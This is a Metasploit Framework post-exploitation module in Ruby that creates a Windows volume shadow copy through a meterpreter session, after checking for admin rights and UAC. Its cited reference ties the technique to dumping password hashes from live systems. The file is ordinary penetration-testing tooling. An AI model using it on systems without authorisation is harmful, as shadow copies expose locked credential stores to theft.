##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex'
require 'msf/core/post/windows/shadowcopy'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::ShadowCopy

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Windows Manage Create Shadow Copy",
			'Description'          => %q{
				This module will attempt to create a new volume shadow copy.
				This is based on the VSSOwn Script originally posted by
				Tim Tomes and Mark Baggett.

				Works on win2k3 and later.
				},
			'License'              => MSF_LICENSE,
			'Platform'             => ['windows'],
			'SessionTypes'         => ['meterpreter'],
			'Author'               => ['theLightCosine'],
			'References'    => [
				[ 'URL', 'http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html' ]
			]
		))
		register_options(
			[
				OptString.new('VOLUME', [ true, 'Volume to make a copy of.', 'C:\\'])
			], self.class)

	end


	def run
		unless is_admin?
			print_error("This module requires admin privs to run")
			return
		end
		if is_uac_enabled?
			print_error("This module requires UAC to be bypassed first")
			return
		end
		unless start_vss
			return
		end
		id = create_shadowcopy(datastore['VOLUME'])
		if id
			print_good "Shadow Copy #{id} created!"
		end
	end



end
